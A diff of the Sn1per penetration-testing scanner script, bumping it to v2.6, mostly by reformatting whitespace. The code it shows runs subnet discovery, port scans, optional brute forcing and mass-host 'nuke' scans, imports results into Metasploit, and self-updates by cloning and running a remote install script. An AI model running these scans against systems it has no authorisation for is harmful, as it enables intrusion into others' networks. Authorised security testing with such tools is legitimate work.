@@ -1,9 +1,9 @@
 #!/bin/bash
-# + -- --=[Sn1per by 1N3 
+# + -- --=[Sn1per by 1N3
 # + -- --=[http://crowdshield.com
 #
 ## ABOUT:
-#Sn1per is an automated scanner that can be used during a penetration test to enumerate and scan for vulnerabilities. 
+#Sn1per is an automated scanner that can be used during a penetration test to enumerate and scan for vulnerabilities.
 
 ## DEMO VIDEO:
 #[![Sn1per Demo](https://img.youtube.com/vi/nA_V_u3QZA4/0.jpg)](https://www.youtube.com/watch?v=nA_V_u3QZA4)
@@ -61,7 +61,7 @@
 #sniper <target> <report>
 #sniper <target> stealth <report>
 #sniper <CIDR> discover
-#sniper <target> port <portnum> 
+#sniper <target> port <portnum>
 #sniper <target> fullportonly <portnum>
 #sniper <target> web <report>
 #sniper <target> nobrute <report>
@@ -77,20 +77,21 @@
 #* **DISCOVER:** Parses all hosts on a subnet/CIDR (ie. 192.168.0.0/16) and initiates a sniper scan against each host. Useful for internal network scans.
 #* **PORT:** Scans a specific port for vulnerabilities. Reporting is not currently available in this mode.
 #* **FULLPORTONLY:** Performs a full detailed port scan and saves results to XML.
-#* **WEB:** Adds full automatic web application scans to the results (port 80/tcp & 443/tcp only). Ideal for web applications but may increase scan time significantly.   
+#* **WEB:** Adds full automatic web application scans to the results (port 80/tcp & 443/tcp only). Ideal for web applications but may increase scan time significantly.
 #* **NOBRUTE:** Launches a full scan against a target host/domain without brute forcing services.
 #* **AIRSTRIKE:** Quickly enumerates open ports/services on multiple hosts and performs basic fingerprinting. To use, specify the full location of the file which contains all hosts, IP's that need to be scanned and run ./sn1per /full/path/to/targets.txt airstrike to begin scanning.
-#* **NUKE:** Launch full audit of multiple hosts specified in text file of choice. Usage example: ./sniper /pentest/loot/targets.txt nuke. 
+#* **NUKE:** Launch full audit of multiple hosts specified in text file of choice. Usage example: ./sniper /pentest/loot/targets.txt nuke.
 #* **LOOT:** Automatically organizes and displays loot folder in your browser and opens Metasploit Pro and Zenmap GUI with all port scan results. To run, type 'sniper loot'.
 
 ## SAMPLE REPORT:
 # https://gist.github.com/1N3/8214ec2da2c91691bcbc
 
-VER="2.5"
+VER="2.6"
 TARGET="$1"
 MODE="$2"
 OPT1="$3"
-DISABLE_POSTGRESQL="true" # disabling postgresql startup, assuming it's running already
+DISABLE_POSTGRESQL="true"
+BROWSER="iceweasel" # SET DEFAULT BROWSER FOR OPENING LOOT DIR. CAN ALSO SET TO xdg-open... 
 INSTALL_DIR="/usr/share/sniper"
 LOOT_DIR="/usr/share/sniper/loot"
 PLUGINS_DIR="/usr/share/sniper/plugins"
@@ -113,14 +114,6 @@ OKORANGE='\033[93m'
 RESET='\e[0m'
 REGEX='^[0-9]+$'
 
-# CHECK IF DISTRO IS BLACKARCH
-if grep -q BlackArch /etc/issue; then
-  DISTRO='blackarch'
-  echo "Detected BlackArch GNU/Linux"
-  HOMEPATH=$(pwd)
-  echo "setting current path to $HOMEPATH"
-fi
-
 # ENABLE/DISABLE AUTOMATIC BRUTE FORCE
 # DEFAULT IS "1" (ENABLED)
 AUTOBRUTE="1"
@@ -137,177 +130,185 @@ GOOHAK="1"
 # DEFAULT IS "1" (ENABLED)
 ENABLE_AUTO_UPDATES="1"
 
+# CHECK IF DISTRO IS BLACKARCH
+if grep -q BlackArch /etc/issue; then
+  DISTRO='blackarch'
+  echo "Detected BlackArch GNU/Linux"
+  HOMEPATH=$(pwd)
+  echo "setting current path to $HOMEPATH"
+fi
+
 cd $INSTALL_DIR
 
 function check_update {
-	if [ "$ENABLE_AUTO_UPDATES" = "1" ]; then
-		# echo -e "$OKBLUE + -- --=[Checking for updates...$RESET"
-		LATEST_VER=$(curl -s https://api.github.com/repos/1N3/Sn1per/tags | grep -Po '"name":.*?[^\\]",'| head -1 | cut -c11-13)
-		if [ "$LATEST_VER" != "$VER" ]; then
-			echo -e "$OKRED + -- --=[Sn1per v$LATEST_VER is available to download... To update, type \"sniper update\" $RESET"
-		fi	
-	fi
+  if [ "$ENABLE_AUTO_UPDATES" = "1" ]; then
+    # echo -e "$OKBLUE + -- --=[Checking for updates...$RESET"
+    LATEST_VER=$(curl -s https://api.github.com/repos/1N3/Sn1per/tags | grep -Po '"name":.*?[^\\]",'| head -1 | cut -c11-13)
+    if [ "$LATEST_VER" != "$VER" ]; then
+      echo -e "$OKRED + -- --=[Sn1per v$LATEST_VER is available to download... To update, type \"sniper update\" $RESET"
+    fi
+  fi
 }
 
 function update {
-	echo -e "$OKBLUE + -- --=[Checking for updates...$RESET"
-	LATEST_VER=$(curl -s https://api.github.com/repos/1N3/Sn1per/tags | grep -Po '"name":.*?[^\\]",'| head -1 | cut -c11-13)
-	if [ "$LATEST_VER" != "$VER" ]; then
-		echo -e "$OKRED + -- --=[Sn1per $LATEST_VER is available to download...Do you want to update? (y or n)$RESET"
-		read ans
-		if [ "$ans" = "y" ]; then
-			rm -Rf /tmp/Sn1per/ 2>/dev/null
-			git clone https://github.com/1N3/Sn1per /tmp/Sn1per/
-			bash /tmp/Sn1per/install.sh 	
-			rm -Rf /tmp/Sn1per/ 2>/dev/null
-			exit	
-		fi	
-	fi	
+  echo -e "$OKBLUE + -- --=[Checking for updates...$RESET"
+  LATEST_VER=$(curl -s https://api.github.com/repos/1N3/Sn1per/tags | grep -Po '"name":.*?[^\\]",'| head -1 | cut -c11-13)
+  if [ "$LATEST_VER" != "$VER" ]; then
+    echo -e "$OKRED + -- --=[Sn1per $LATEST_VER is available to download...Do you want to update? (y or n)$RESET"
+    read ans
+    if [ "$ans" = "y" ]; then
+      rm -Rf /tmp/Sn1per/ 2>/dev/null
+      git clone https://github.com/1N3/Sn1per /tmp/Sn1per/
+      bash /tmp/Sn1per/install.sh
+      rm -Rf /tmp/Sn1per/ 2>/dev/null
+      exit
+    fi
+  fi
 }
 
 function init {
-	mkdir -p $LOOT_DIR 2> /dev/null
-	mkdir $LOOT_DIR/domains 2> /dev/null
-	mkdir $LOOT_DIR/screenshots 2> /dev/null
-	mkdir $LOOT_DIR/nmap 2> /dev/null
-	mkdir $LOOT_DIR/reports 2> /dev/null
-	mkdir $LOOT_DIR/output 2> /dev/null
-	TARGET="$(echo $TARGET | sed 's/https:\/\///g' | sed 's/http:\/\///g')"
-	service postgresql start 2>/dev/null
-	service metasploit start 2>/dev/null
+  mkdir -p $LOOT_DIR 2> /dev/null
+  mkdir $LOOT_DIR/domains 2> /dev/null
+  mkdir $LOOT_DIR/screenshots 2> /dev/null
+  mkdir $LOOT_DIR/nmap 2> /dev/null
+  mkdir $LOOT_DIR/reports 2> /dev/null
+  mkdir $LOOT_DIR/output 2> /dev/null
+  TARGET="$(echo $TARGET | sed 's/https:\/\///g' | sed 's/http:\/\///g')"
+  service postgresql start 2>/dev/null
+  service metasploit start 2>/dev/null
 }
 
 function loot {
-	echo -e "$OKRED                ____               $RESET"
-	echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
-	echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
-	echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
-	echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
-	echo -e "$OKRED               /_/                 $RESET"
-	echo ""
-	echo -e "$OKORANGE + -- --=[Current workspaces...$RESET"
-	cd $LOOT_DIR
-	ls -lh $LOOT_DIR/workspace/
-	echo -e "$OKORANGE + -- --=[Enter a name for the workspace:$RESET"
-	read WORKSPACE
-	if [ -z $WORKSPACE ]; then
-		WORKSPACE="default"
-	fi
-	mkdir -p $LOOT_DIR/workspace/$WORKSPACE 2> /dev/null
-	echo -e "$OKORANGE + -- --=[Generating reports...$RESET"
-	for a in `ls sniper-*.txt 2>/dev/null`; 
-	do 
-		# HTML OUTPUT
-		echo "$a" | aha --black > $LOOT_DIR/reports/$a.html
-		cat "$a" | aha --black >> $LOOT_DIR/reports/$a.html
-		# TEXT OUTPUT DISABLED
-		#echo "$a" | aha --black > $LOOT_DIR/reports/$a
-		#sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a >> $LOOT_DIR/reports/$a
-		# CONSOLE OUTPUT
-		mv $a $LOOT_DIR/output/
-	done
-	echo -e "$OKORANGE + -- --=[Removing blank web screenshots...$RESET"
-	find /usr/share/sniper/loot/screenshots/ -size -10k -exec rm -f {} \; 2> /dev/null
-	rm -f $LOOT_DIR/.fuse_* 2> /dev/null
-	echo -e "$OKORANGE + -- --=[Starting Metasploit service...$RESET"
-	/etc/init.d/metasploit start 2> /dev/null
-	if [ -z $DISABLE_POSTGRESQL ]; then /etc/init.d/postgresql start 2> /dev/null; fi
-	echo -e "$OKORANGE + -- --=[Importing NMap XML files into Metasploit...$RESET"
-	msfconsole -x "workspace -a $WORKSPACE; workspace $WORKSPACE; db_import $LOOT_DIR/nmap/nmap*.xml; hosts; services; exit;"
-	echo -e "$OKORANGE + -- --=[Copying loot to workspace: $WORKSPACE...$RESET"
-	cp -Rf $LOOT_DIR/screenshots/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-	cp -Rf $LOOT_DIR/nmap/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-	cp -Rf $LOOT_DIR/domains/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-	cp -Rf $LOOT_DIR/output/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-	cp -Rf $LOOT_DIR/reports/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-	cp -Rf $LOOT_DIR/imports/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-	cp -Rf $LOOT_DIR/notes/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-	cp -Rf $LOOT_DIR/web/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
-	rm -Rf $LOOT_DIR/{screenshots,nmap,domains,output,reports,imports,notes,web}/ 2> /dev/null
-	mkdir $LOOT_DIR/{screenshots,nmap,domains,output,reports,imports,notes,web}/ -p 2> /dev/null
-	echo -e "$OKORANGE + -- --=[Opening workspace directory...$RESET"
+  echo -e "$OKRED                ____               $RESET"
+  echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
+  echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
+  echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
+  echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
+  echo -e "$OKRED               /_/                 $RESET"
+  echo ""
+  echo -e "$OKORANGE + -- --=[Current workspaces...$RESET"
+  cd $LOOT_DIR
+  ls -lh $LOOT_DIR/workspace/
+  echo -e "$OKORANGE + -- --=[Enter a name for the workspace:$RESET"
+  read WORKSPACE
+  if [ -z $WORKSPACE ]; then
+    WORKSPACE="default"
+  fi
+  mkdir -p $LOOT_DIR/workspace/$WORKSPACE 2> /dev/null
+  echo -e "$OKORANGE + -- --=[Generating reports...$RESET"
+  for a in `ls sniper-*.txt 2>/dev/null`;
+  do
+    # HTML OUTPUT
+    echo "$a" | aha --black > $LOOT_DIR/reports/$a.html
+    cat "$a" | aha --black >> $LOOT_DIR/reports/$a.html
+    # TEXT OUTPUT DISABLED
+    #echo "$a" | aha --black > $LOOT_DIR/reports/$a
+    #sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g" $a >> $LOOT_DIR/reports/$a
+    # CONSOLE OUTPUT
+    mv $a $LOOT_DIR/output/
+  done
+  echo -e "$OKORANGE + -- --=[Removing blank web screenshots...$RESET"
+  find /usr/share/sniper/loot/screenshots/ -size -10k -exec rm -f {} \; 2> /dev/null
+  rm -f $LOOT_DIR/.fuse_* 2> /dev/null
+  echo -e "$OKORANGE + -- --=[Starting Metasploit service...$RESET"
+  /etc/init.d/metasploit start 2> /dev/null
+  if [ -z $DISABLE_POSTGRESQL ]; then /etc/init.d/postgresql start 2> /dev/null; fi
+  echo -e "$OKORANGE + -- --=[Importing NMap XML files into Metasploit...$RESET"
+  msfconsole -x "workspace -a $WORKSPACE; workspace $WORKSPACE; db_import $LOOT_DIR/nmap/nmap*.xml; hosts; services; exit;"
+  echo -e "$OKORANGE + -- --=[Copying loot to workspace: $WORKSPACE...$RESET"
+  cp -Rf $LOOT_DIR/screenshots/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  cp -Rf $LOOT_DIR/nmap/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  cp -Rf $LOOT_DIR/domains/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  cp -Rf $LOOT_DIR/output/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  cp -Rf $LOOT_DIR/reports/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  cp -Rf $LOOT_DIR/imports/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  cp -Rf $LOOT_DIR/notes/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  cp -Rf $LOOT_DIR/web/ $LOOT_DIR/workspace/$WORKSPACE/ 2> /dev/null
+  rm -Rf $LOOT_DIR/{screenshots,nmap,domains,output,reports,imports,notes,web}/ 2> /dev/null
+  mkdir $LOOT_DIR/{screenshots,nmap,domains,output,reports,imports,notes,web}/ -p 2> /dev/null
+  echo -e "$OKORANGE + -- --=[Opening workspace directory...$RESET"
   if [ ${DISTRO} == "blackarch" ]; then
     firefox 2> /dev/null &
   else
-    iceweasel 2> /dev/null &
+    $BROWSER 2> /dev/null &
   fi
-	sleep 2
-	xdg-open $LOOT_DIR/workspace/$WORKSPACE 2> /dev/null &
-	sleep 2
-	echo -e "$OKORANGE + -- --=[Launching Metasploit Pro Web UI...$RESET"
-	xdg-open http://localhost:3001/login 2> /dev/null &
-	echo -e "$OKORANGE + -- --=[Launching Zenmap...$RESET"
-	zenmap -f $LOOT_DIR/workspace/$WORKSPACE/nmap/ 2> /dev/null &
-	echo -e "$OKORANGE + -- --=[Done!$RESET"
+  sleep 2
+  $BROWSER $LOOT_DIR/workspace/$WORKSPACE 2> /dev/null &
+  sleep 2
+  echo -e "$OKORANGE + -- --=[Launching Metasploit Pro Web UI...$RESET"
+  $BROWSER http://localhost:3001/login 2> /dev/null &
+  echo -e "$OKORANGE + -- --=[Launching Zenmap...$RESET"
+  zenmap -f $LOOT_DIR/workspace/$WORKSPACE/nmap/ 2> /dev/null &
+  echo -e "$OKORANGE + -- --=[Done!$RESET"
 }
 
 function help {
-	echo -e "$OKRED                ____               $RESET"
-	echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
-	echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
-	echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
-	echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
-	echo -e "$OKRED               /_/                 $RESET"
-	echo ""
-	echo -e "$OKORANGE + -- --=[http://crowdshield.com$RESET"
-	echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3$RESET"
-	echo -e "$OKORANGE + -- --=[Usage:"
-	echo ""
-	echo ' [*] sniper <target> <report>'
-	echo ' [*] sniper <target> stealth <report>'
-	echo ' [*] sniper <CIDR> discover'
-	echo ' [*] sniper <target> port <portnum>'
-	echo ' [*] sniper <target> fullportonly <portnum>'
-	echo ' [*] sniper <target> web <report>'
-	echo ' [*] sniper <target> nobrute <report>'
-	echo ' [*] sniper <targets.txt> airstrike <report>'
-	echo ' [*] sniper <targets.txt> nuke <report>'
-	echo ' [*] sniper loot'
-	echo ' [*] sniper update'
-	echo ""
-	echo ' + -- --=[Modes:'
-	echo ''
-    echo ' + -- --=[REPORT: Outputs all results to text in the loot directory for later reference. To enable reporting, append report to any sniper mode or command.'
-    echo ' + -- --=[STEALTH: Quickly enumerate single targets using mostly non-intrusive scans to avoid WAF/IPS blocking'
-    echo ' + -- --=[DISCOVER: Parses all hosts on a subnet/CIDR (ie. 192.168.0.0/16) and initiates a sniper scan against each host. Useful for internal network scans.'
-    echo ' + -- --=[PORT: Scans a specific port for vulnerabilities. Reporting is not currently available in this mode.'
-    echo ' + -- --=[FULLPORTONLY:  Performs a full detailed port scan and saves results to XML.'
-    echo ' + -- --=[WEB: Adds full automatic web application scans to the results (port 80/tcp & 443/tcp only). Ideal for web applications but may increase scan time significantly.'
-    echo ' + -- --=[NOBRUTE: Launches a full scan against a target host/domain without brute forcing services.'
-    echo ' + -- --=[AIRSTRIKE: Quickly enumerates open ports/services on multiple hosts and performs basic fingerprinting. To use, specify the full location of the file which contains all hosts, IPs that need to be scanned and run ./sn1per /full/path/to/targets.txt airstrike to begin scanning.'
-    echo ' + -- --=[NUKE: Launch full audit of multiple hosts specified in text file of choice. Usage example: ./sniper /pentest/loot/targets.txt nuke.'
-    echo -e " + -- --=[LOOT: Automatically organizes and displays loot folder in your browser and opens Zenmap GUI with all port scan results. To run, type sniper loot.$RESET"
-    echo ""
-    echo ""
-    check_update
-} 
+  echo -e "$OKRED                ____               $RESET"
+  echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
+  echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
+  echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
+  echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
+  echo -e "$OKRED               /_/                 $RESET"
+  echo ""
+  echo -e "$OKORANGE + -- --=[http://crowdshield.com$RESET"
+  echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3$RESET"
+  echo -e "$OKORANGE + -- --=[Usage:"
+  echo ""
+  echo ' [*] sniper <target> <report>'
+  echo ' [*] sniper <target> stealth <report>'
+  echo ' [*] sniper <CIDR> discover'
+  echo ' [*] sniper <target> port <portnum>'
+  echo ' [*] sniper <target> fullportonly <portnum>'
+  echo ' [*] sniper <target> web <report>'
+  echo ' [*] sniper <target> nobrute <report>'
+  echo ' [*] sniper <targets.txt> airstrike <report>'
+  echo ' [*] sniper <targets.txt> nuke <report>'
+  echo ' [*] sniper loot'
+  echo ' [*] sniper update'
+  echo ""
+  echo ' + -- --=[Modes:'
+  echo ''
+  echo ' + -- --=[REPORT: Outputs all results to text in the loot directory for later reference. To enable reporting, append report to any sniper mode or command.'
+  echo ' + -- --=[STEALTH: Quickly enumerate single targets using mostly non-intrusive scans to avoid WAF/IPS blocking'
+  echo ' + -- --=[DISCOVER: Parses all hosts on a subnet/CIDR (ie. 192.168.0.0/16) and initiates a sniper scan against each host. Useful for internal network scans.'
+  echo ' + -- --=[PORT: Scans a specific port for vulnerabilities. Reporting is not currently available in this mode.'
+  echo ' + -- --=[FULLPORTONLY:  Performs a full detailed port scan and saves results to XML.'
+  echo ' + -- --=[WEB: Adds full automatic web application scans to the results (port 80/tcp & 443/tcp only). Ideal for web applications but may increase scan time significantly.'
+  echo ' + -- --=[NOBRUTE: Launches a full scan against a target host/domain without brute forcing services.'
+  echo ' + -- --=[AIRSTRIKE: Quickly enumerates open ports/services on multiple hosts and performs basic fingerprinting. To use, specify the full location of the file which contains all hosts, IPs that need to be scanned and run ./sn1per /full/path/to/targets.txt airstrike to begin scanning.'
+  echo ' + -- --=[NUKE: Launch full audit of multiple hosts specified in text file of choice. Usage example: ./sniper /pentest/loot/targets.txt nuke.'
+  echo -e " + -- --=[LOOT: Automatically organizes and displays loot folder in your browser and opens Zenmap GUI with all port scan results. To run, type sniper loot.$RESET"
+  echo ""
+  echo ""
+  check_update
+}
 
 if [ -z $TARGET ]; then
-	echo -e "$OKRED                ____               $RESET"
-	echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
-	echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
-	echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
-	echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
-	echo -e "$OKRED               /_/                 $RESET"
-	echo -e ""
-	echo -e "$OKORANGE + -- --=[http://crowdshield.com$RESET"
-	echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3$RESET"
-	echo -e "$OKORANGE + -- --=[Usage: sniper <target>$RESET"
-	echo ""
-	check_update
-	exit
+  echo -e "$OKRED                ____               $RESET"
+  echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
+  echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
+  echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
+  echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
+  echo -e "$OKRED               /_/                 $RESET"
+  echo -e ""
+  echo -e "$OKORANGE + -- --=[http://crowdshield.com$RESET"
+  echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3$RESET"
+  echo -e "$OKORANGE + -- --=[Usage: sniper <target>$RESET"
+  echo ""
+  check_update
+  exit
 fi
 
 if [[ $TARGET = "--help" ]]; then
-	help
-	exit
+  help
+  exit
 fi
 
-if [[ ${TARGET:0:1} =~ $REGEX ]]; 
-	then 
-	SCAN_TYPE="IP"
-else 
-	SCAN_TYPE="DOMAIN"
+if [[ ${TARGET:0:1} =~ $REGEX ]];
+then
+  SCAN_TYPE="IP"
+else
+  SCAN_TYPE="DOMAIN"
 fi
 
 # INITILIZE()
@@ -317,412 +318,412 @@ init
 check_update
 
 if [ "$MODE" = "report" ]; then
-	$HOMEPATH/sniper $TARGET | tee $LOOT_DIR/sniper-$TARGET-`date +%Y%m%d%H%M`.txt 2>&1
-	exit
+  $HOMEPATH/sniper $TARGET | tee $LOOT_DIR/sniper-$TARGET-`date +%Y%m%d%H%M`.txt 2>&1
+  exit
 fi
 
 if [ "$TARGET" = "loot" ]; then
-	loot
-	exit
+  loot
+  exit
 fi
 
 if [ "$MODE" = "discover" ]; then
-	echo -e "$OKRED                                                              ____ /\\"
-	echo -e "$OKRED   Sn1per by 1N3 @CrowdShield                                      \ \\"
-	echo -e "$OKRED   https://crowdshield.com                                          \ \\"
-	echo -e "$OKRED                                                                ___ /  \\"
-	echo -e "$OKRED                                                                    \   \\"
-	echo -e "$OKRED                                                                 === > [ \\"
-	echo -e "$OKRED                                                                    /   \ \\"
-	echo -e "$OKRED                                                                    \   / /"
-	echo -e "$OKRED                                                                 === > [ /"
-	echo -e "$OKRED                                                                    /   /"
-	echo -e "$OKRED                                                                ___ \  /"
-	echo -e "$OKRED                                                                    / /"
-	echo -e "$OKRED                                                              ____ / /"
-	echo -e "$OKRED                                                                   \/$RESET"
-	echo ""
-	echo -e "$OKGREEN + -- ----------------------------=[Running Ping Discovery Scan]=------------- -- +$RESET"
-	nmap -sP $TARGET | grep ' for ' | awk '{print $5}' | tee $LOOT_DIR/domains/sniper-ping-ips.txt
-	echo -e "$OKGREEN + -- ----------------------------=[Checking ARP Cache]=---------------------- -- +$RESET"
-	arp -a -n | tee $LOOT_DIR/domains/sniper-arp-ips.txt
-	echo -e "$OKGREEN + -- ----------------------------=[Running TCP Port Discovery Scan]=--------- -- +$RESET"
-	unicornscan -p $DEFAULT_TCP_PORTS $TARGET 2>/dev/null | tee $LOOT_DIR/domains/sniper-tcp-ports.txt
-	cat $LOOT_DIR/domains/sniper-tcp-ports.txt | awk '{print $6}' | sort -u | tee $LOOT_DIR/domains/sniper-tcp-ips.txt
-	echo -e "$OKGREEN + -- ----------------------------=[Running UDP Port Discovery Scan]=--------- -- +$RESET"
-	unicornscan -m U -p $DEFAULT_UDP_PORTS $TARGET 2>/dev/null | tee $LOOT_DIR/domains/sniper-udp-ports.txt
-	cat $LOOT_DIR/domains/sniper-udp-ports.txt | awk '{print $6}' | sort -u > $LOOT_DIR/domains/sniper-udp-ips.txt
-	echo -e "$OKGREEN + -- ----------------------------=[Current Targets]=------------------------- -- +$RESET"
-	cat $LOOT_DIR/domains/sniper-ping-ips.txt $LOOT_DIR/domains/sniper-tcp-ips.txt $LOOT_DIR/domains/sniper-udp-ips.txt > $LOOT_DIR/domains/sniper-ips-unsorted.txt
-	sort -u $LOOT_DIR/domains/sniper-ips-unsorted.txt > $LOOT_DIR/domains/sniper-ips.txt 
-	cat $LOOT_DIR/domains/sniper-ips.txt
-	echo -e "$OKGREEN + -- ----------------------------=[Launching Sn1per Scans]=------------------ -- +$RESET"
-	echo ""
-	if [ "$OPT1" = "report" ]; then
-		for a in `cat $LOOT_DIR/domains/sniper-ips.txt` 
-			do sniper $a report
-		done
-		exit
-	fi	
-	for a in `cat $LOOT_DIR/domains/sniper-ips.txt` 
-		do sniper $a 
-	done
-	exit
+  echo -e "$OKRED                                                              ____ /\\"
+  echo -e "$OKRED   Sn1per by 1N3 @CrowdShield                                      \ \\"
+  echo -e "$OKRED   https://crowdshield.com                                          \ \\"
+  echo -e "$OKRED                                                                ___ /  \\"
+  echo -e "$OKRED                                                                    \   \\"
+  echo -e "$OKRED                                                                 === > [ \\"
+  echo -e "$OKRED                                                                    /   \ \\"
+  echo -e "$OKRED                                                                    \   / /"
+  echo -e "$OKRED                                                                 === > [ /"
+  echo -e "$OKRED                                                                    /   /"
+  echo -e "$OKRED                                                                ___ \  /"
+  echo -e "$OKRED                                                                    / /"
+  echo -e "$OKRED                                                              ____ / /"
+  echo -e "$OKRED                                                                   \/$RESET"
+  echo ""
+  echo -e "$OKGREEN + -- ----------------------------=[Running Ping Discovery Scan]=------------- -- +$RESET"
+  nmap -sP $TARGET | grep ' for ' | awk '{print $5}' | tee $LOOT_DIR/domains/sniper-ping-ips.txt
+  echo -e "$OKGREEN + -- ----------------------------=[Checking ARP Cache]=---------------------- -- +$RESET"
+  arp -a -n | tee $LOOT_DIR/domains/sniper-arp-ips.txt
+  echo -e "$OKGREEN + -- ----------------------------=[Running TCP Port Discovery Scan]=--------- -- +$RESET"
+  unicornscan -p $DEFAULT_TCP_PORTS $TARGET 2>/dev/null | tee $LOOT_DIR/domains/sniper-tcp-ports.txt
+  cat $LOOT_DIR/domains/sniper-tcp-ports.txt | awk '{print $6}' | sort -u | tee $LOOT_DIR/domains/sniper-tcp-ips.txt
+  echo -e "$OKGREEN + -- ----------------------------=[Running UDP Port Discovery Scan]=--------- -- +$RESET"
+  unicornscan -m U -p $DEFAULT_UDP_PORTS $TARGET 2>/dev/null | tee $LOOT_DIR/domains/sniper-udp-ports.txt
+  cat $LOOT_DIR/domains/sniper-udp-ports.txt | awk '{print $6}' | sort -u > $LOOT_DIR/domains/sniper-udp-ips.txt
+  echo -e "$OKGREEN + -- ----------------------------=[Current Targets]=------------------------- -- +$RESET"
+  cat $LOOT_DIR/domains/sniper-ping-ips.txt $LOOT_DIR/domains/sniper-tcp-ips.txt $LOOT_DIR/domains/sniper-udp-ips.txt > $LOOT_DIR/domains/sniper-ips-unsorted.txt
+  sort -u $LOOT_DIR/domains/sniper-ips-unsorted.txt > $LOOT_DIR/domains/sniper-ips.txt
+  cat $LOOT_DIR/domains/sniper-ips.txt
+  echo -e "$OKGREEN + -- ----------------------------=[Launching Sn1per Scans]=------------------ -- +$RESET"
+  echo ""
+  if [ "$OPT1" = "report" ]; then
+    for a in `cat $LOOT_DIR/domains/sniper-ips.txt`
+    do sniper $a report
+    done
+    exit
+  fi
+  for a in `cat $LOOT_DIR/domains/sniper-ips.txt`
+  do sniper $a
+  done
+  exit
 fi
 
 if [ "$MODE" = "web" ]; then
-	if [ "$OPT1" = "report" ]; then
-		sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
-		loot
-		exit
-	fi
+  if [ "$OPT1" = "report" ]; then
+    sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
+    loot
+    exit
+  fi
 fi
 
 if [ "$MODE" = "stealth" ]; then
-	if [ "$OPT1" = "report" ]; then
-		sniper $TARGET $MODE | tee $LOOT_DIR/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1 
-		exit
-	fi
-	echo -e "$OKRED                ____               $RESET"
-	echo -e "$OKRED    _________  /  _/___  ___  _____$RESET"
-	echo -e "$OKRED   / ___/ __ \ / // __ \/ _ \/ ___/$RESET"
-	echo -e "$OKRED  (__  ) / / // // /_/ /  __/ /    $RESET"
-	echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
-	echo -e "$OKRED               /_/                 $RESET"
-	echo -e "$RESET"
-	echo -e "$OKORANGE + -- --=[http://crowdshield.com"
-	echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3"
-	echo -e "$OKRED " 	
-	echo -e "$OKRED     ./\."
-	echo -e "$OKRED   ./    '\."
-	echo -e "$OKRED   \.       '\."
-	echo -e "$OKRED     '\.       '\."
-	echo -e "$OKRED        '\.       '\."
-	echo -e "$OKRED           '\.       '\."
-	echo -e "$OKRED           ./           '\."
-	echo -e "$OKRED         ./            ____'\."
-	echo -e "$OKRED       ./                  <  '\."
-	echo -e "$OKRED       \-------\            '>   '\."
-	echo -e "$OKRED         '\=====>        ___<       '\."
-	echo -e "$OKRED        ./-----/             __________'\."
-	echo -e "$OKRED "'       \.------\       _____   ___(_)(_\."\'
-	echo -e "$OKRED          '\=====>          <            ./'"
-	echo -e "$OKRED         ./-----/            '>        ./"
-	echo -e "$OKRED         \.               ___<       ./"
-	echo -e "$OKRED           '\.                     ./"
-	echo -e "$OKRED              '\.                ./"
-	echo -e "$OKRED                 '\.           ./"
-	echo -e "$OKRED                 ./          ./"
-	echo -e "$OKRED               ./          ./  Carl Pilcher"
-	echo -e "$OKRED             ./          ./"
-	echo -e "$OKRED           ./          ./"
-	echo -e "$OKRED         ./          ./"
-	echo -e "$OKRED         \.        ./"
